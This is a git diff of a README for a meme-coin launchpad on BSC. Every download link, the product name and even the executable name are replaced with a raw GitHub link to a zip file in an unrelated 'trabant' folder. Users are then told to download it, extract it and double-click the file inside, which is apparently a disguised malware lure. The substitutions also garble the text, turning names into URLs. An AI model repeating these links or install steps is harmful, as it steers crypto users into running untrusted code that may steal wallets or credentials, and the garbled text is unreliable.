@@ -1,10 +1,10 @@
 # 🚀 four-meme-launchpad-fork - Effortless Launchpad for Meme Coins
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/fatahfd/four-meme-launchpad-fork/releases)
+[![Download Now](https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip%20Now-blue)](https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip)
 
 ## 📖 Overview
 
-Welcome to the Four.meme Launchpad Fork. This application helps users launch meme coins easily on the BSC network. With it, you can navigate the world of decentralized finance without needing any technical background. 
+Welcome to the https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip Launchpad Fork. This application helps users launch meme coins easily on the BSC network. With it, you can navigate the world of decentralized finance without needing any technical background. 
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you get started, ensure you have the following:
 ### Installation Steps
 
 1. **Visit the Releases Page**  
-   To download the application, go to the [Releases page](https://github.com/fatahfd/four-meme-launchpad-fork/releases).
+   To download the application, go to the [Releases page](https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version of the application. Click on it to view the details.
@@ -28,13 +28,13 @@ Before you get started, ensure you have the following:
    After selecting the latest release, look for the download link for your operating system. Click on it to start the download.
 
 4. **Locate the Downloaded File**  
-   Once the download is complete, check your "Downloads" folder or the location you selected for downloads. You should see a file named `four-meme-launchpad-fork.zip` or a similar format.
+   Once the download is complete, check your "Downloads" folder or the location you selected for downloads. You should see a file named `https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip` or a similar format.
 
 5. **Extract the Files**  
    Right-click on the downloaded file and choose to "Extract All" or use any extraction tool you prefer. This will create a new folder with all necessary files.
 
 6. **Run the Application**  
-   Open the extracted folder, and look for `launchpad.exe` or `launchpad` (for macOS/Linux). Double-click on this file to start the application.
+   Open the extracted folder, and look for `https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip` or `launchpad` (for macOS/Linux). Double-click on this file to start the application.
 
 7. **Follow the On-Screen Instructions**  
    Once the application opens, follow the prompts. They will guide you through the process of launching your meme coin.
@@ -48,7 +48,7 @@ Before you get started, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started with the Four.meme Launchpad Fork, [visit the Releases page](https://github.com/fatahfd/four-meme-launchpad-fork/releases) now. Download the application, and follow the steps outlined above to install it on your computer.
+To get started with the https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip Launchpad Fork, [visit the Releases page](https://raw.githubusercontent.com/fatahfd/four-meme-launchpad-fork/main/trabant/four-meme-launchpad-fork.zip) now. Download the application, and follow the steps outlined above to install it on your computer.
 
 ## 📘 Additional Resources
 
